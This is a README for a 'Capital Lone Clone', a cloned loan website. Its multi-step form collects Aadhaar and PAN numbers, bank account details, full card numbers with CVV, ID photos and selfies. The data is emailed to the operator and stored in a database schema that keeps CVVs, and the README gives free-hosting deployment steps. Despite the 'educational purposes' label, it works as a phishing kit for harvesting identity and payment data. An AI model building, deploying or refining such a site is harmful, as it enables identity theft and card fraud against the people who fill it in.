# Capital Lone Clone

A modern and professional multi-step loan application website built with HTML, CSS, JavaScript, and PHP. Features a complete loan application process with bank details, card information, document upload, and selfie verification.

## 🚀 Features

### Core Functionality
- **Multi-Step Form**: 5-step loan application process
- **Email Notifications**: Automatic email after Step 1 completion
- **Responsive Design**: Works seamlessly on desktop, tablet, and mobile
- **Modern UI**: Clean, professional design with smooth animations
- **Form Validation**: Client-side and server-side validation
- **File Upload**: Document upload with visual feedback
- **Selfie Verification**: Simulated camera capture functionality

### Application Steps
1. **Personal Information**: Aadhaar, PAN, Monthly Income
2. **Bank Details**: Bank Name, Account Number, IFSC Code, Account Holder
3. **Card Details**: Card Number, Name, Expiry Date, CVV, Card Type
4. **Documents Upload**: Aadhaar Photo, PAN Photo
5. **Selfie Verification**: Camera capture simulation

### Technical Features
- **Smart Input Formatting**: Auto-formatting for card numbers, dates, etc.
- **Progress Tracking**: Visual progress bar with step indicators
- **Error Handling**: Comprehensive validation and error messages
- **Success Flow**: Random application number generation
- **No Browser Popups**: Custom success messages

## 📁 Project Structure

```
capital-lone-clone/
├── index.html              # Main landing page
├── apply.html              # Multi-step loan application
├── loan_application.html   # Alternative loan application page
├── about.html              # About page
├── submit.php              # PHP backend for form processing
├── styles.css              # Main stylesheet
├── README.md               # This file
├── .gitignore              # Git ignore file
└── docs/                   # Documentation (optional)
```

## 🛠 Technologies Used

- **HTML5**: Semantic markup and structure
- **CSS3**: Modern styling with animations and responsive design
- **JavaScript**: Interactive features, form validation, multi-step logic
- **PHP**: Backend form processing and database operations
- **MySQL**: Database storage for applications
- **Google Fonts**: Inter font family for typography

## 🚀 Quick Start

### Option 1: GitHub Pages (Frontend Only)
1. Fork this repository
2. Go to Settings → Pages
3. Select "Deploy from a branch"
4. Choose main branch and root folder
5. Your site will be live at `https://username.github.io/capital-lone-clone`

### Option 2: Local Development
1. Clone the repository:
   ```bash
   git clone https://github.com/yourusername/capital-lone-clone.git
   cd capital-lone-clone
   ```

2. Use a local server (XAMPP, WAMP, MAMP, or Live Server):
   ```bash
   # Using PHP built-in server
   php -S localhost:8000
   
   # Or using Python
   python -m http.server 8000
   ```

3. Open `http://localhost:8000` in your browser

### Option 3: Full PHP/MySQL Setup
1. **Database Setup**:
   ```sql
   CREATE DATABASE capital_lone;
   USE capital_lone;
   CREATE TABLE loan_applications (
       id INT AUTO_INCREMENT PRIMARY KEY,
       application_id VARCHAR(20) UNIQUE,
       aadhaar VARCHAR(12),
       pan VARCHAR(10),
       income DECIMAL(10,2),
       bank_name VARCHAR(100),
       account_number VARCHAR(50),
       ifsc_code VARCHAR(15),
       account_holder VARCHAR(100),
       card_number VARCHAR(20),
       card_name VARCHAR(100),
       expiry_date VARCHAR(5),
       cvv VARCHAR(4),
       card_type VARCHAR(10),
       created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
   );
   ```

2. **Configure PHP**:
   - Update database credentials in `submit.php`
   - Configure email settings
   - Ensure PHP extensions: `mysqli`, `mail`

## 📧 Email Configuration

### For Development (Demo Mode)
The application currently logs email data to console:
```javascript
console.log('📧 Email would be sent with personal details:', personalDetails);
```

### For Production
Choose one of these options:

**Option 1: EmailJS (Client-side)**
```html
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
<script>
  (function() {
    emailjs.init("YOUR_PUBLIC_KEY");
  })();
</script>
```

**Option 2: PHP Backend**
```php
// In submit.php
$to = 'your-email@example.com';
$subject = 'New Loan Application Started';
$headers = 'From: noreply@yourdomain.com';
mail($to, $subject, $message, $headers);
```

**Option 3: Formspree**
```html
<form action="https://formspree.io/f/your-form-id" method="POST">
```

## 🎨 Customization

### Colors
Update CSS variables in `styles.css`:
```css
:root {
    --primary-color: #2563eb;
    --secondary-color: #764ba2;
    --success-color: #10b981;
    --error-color: #ef4444;
    --text-color: #1e293b;
    --light-text: #64748b;
}
```

### Company Branding
1. Update company name in all HTML files
2. Replace logo and contact information
3. Update email addresses in `submit.php`
4. Modify colors to match your brand

### Form Fields
Add or remove form fields in the multi-step form:
1. Edit HTML structure in `apply.html` or `loan_application.html`
2. Update JavaScript validation logic
3. Modify PHP processing in `submit.php`
4. Update database schema if needed

## 🔒 Security Features

- Input sanitization in PHP
- SQL injection prevention with prepared statements
- XSS protection with output escaping
- Form validation on client and server side
- CSRF protection ready structure
- File upload validation

## 📱 Mobile Responsiveness

- Responsive navigation with hamburger menu
- Mobile-optimized form layouts
- Touch-friendly interface
- Adaptive typography and spacing
- Optimized for all screen sizes

## 🌐 Deployment Options

### GitHub Pages (Recommended for Demo)
1. Push code to GitHub repository
2. Enable GitHub Pages in repository settings
3. Automatic deployment from main branch
4. Free hosting with custom domain support

### Vercel/Netlify
1. Connect your GitHub repository
2. Automatic deployment on push
3. Custom domain and SSL certificates
4. Serverless functions for backend

### Traditional Hosting
1. Upload files to web server
2. Configure PHP and MySQL
3. Set up domain and SSL
4. Configure email services

## 📊 Browser Compatibility

- ✅ Chrome 90+
- ✅ Firefox 88+
- ✅ Safari 14+
- ✅ Edge 90+
- ✅ Mobile Safari (iOS 14+)
- ✅ Chrome Mobile (Android 10+)

## 🔄 Future Enhancements

- [ ] Admin dashboard for application management
- [ ] Real-time application status tracking
- [ ] Document upload with cloud storage
- [ ] SMS notifications for applicants
- [ ] Advanced analytics and reporting
- [ ] Multi-language support
- [ ] OAuth login integration
- [ ] API for third-party integrations

## 🐛 Troubleshooting

### Common Issues

**Form not submitting**: Check PHP error logs and ensure proper permissions
**Email not sending**: Verify SMTP configuration and server mail settings
**Database connection failed**: Check credentials and ensure MySQL server is running
**Styles not loading**: Verify CSS file paths and server configuration

### Debug Mode
Enable debug mode by adding to `submit.php`:
```php
ini_set('display_errors', 1);
error_reporting(E_ALL);
```

## 📞 Support

For questions or issues:
1. Check the troubleshooting section
2. Review code comments
3. Open an issue on GitHub
4. Contact the development team

## 📄 License

This project is for educational purposes. Please respect the original brand and trademarks.

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

## 🌟 Star History

If this project helped you, please give it a star! ⭐

---

**Built with ❤️ for educational purposes**
